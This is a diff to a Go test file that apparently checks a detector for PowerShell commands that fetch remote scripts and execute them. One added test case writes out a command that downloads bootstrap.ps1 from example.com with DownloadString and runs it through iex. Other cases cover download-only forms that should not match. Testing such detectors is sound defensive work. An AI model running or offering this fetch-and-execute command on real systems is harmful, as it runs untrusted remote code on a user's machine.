@@ -401,6 +401,13 @@ func TestCurlExecutionPatterns(t *testing.T) {
 		}
 	})
 
+	t.Run("detects powershell downloadstring fetch-then-eval form", func(t *testing.T) {
+		line := "powershell -NoProfile -Command \"$s=((New-Object Net.WebClient).DownloadString('https://example.com/bootstrap.ps1')); iex $s\""
+		if !powerShellFetchEvalPattern.MatchString(line) {
+			t.Fatalf("expected powerShellFetchEvalPattern to match %q", line)
+		}
+	})
+
 	t.Run("does not match powershell fetch without eval", func(t *testing.T) {
 		line := "powershell -NoProfile -Command \"iwr https://example.com/bootstrap.ps1 -OutFile bootstrap.ps1\""
 		if powerShellRemoteEvalPattern.MatchString(line) {
@@ -415,6 +422,9 @@ func TestCurlExecutionPatterns(t *testing.T) {
 		line := "powershell -NoProfile -Command \"(New-Object Net.WebClient).DownloadString('https://example.com/bootstrap.ps1') | Out-File bootstrap.ps1\""
 		if powerShellRemoteEvalPattern.MatchString(line) {
 			t.Fatalf("unexpected powerShellRemoteEvalPattern match for %q", line)
+		}
+		if powerShellFetchEvalPattern.MatchString(line) {
+			t.Fatalf("unexpected powerShellFetchEvalPattern match for %q", line)
 		}
 	})
 }
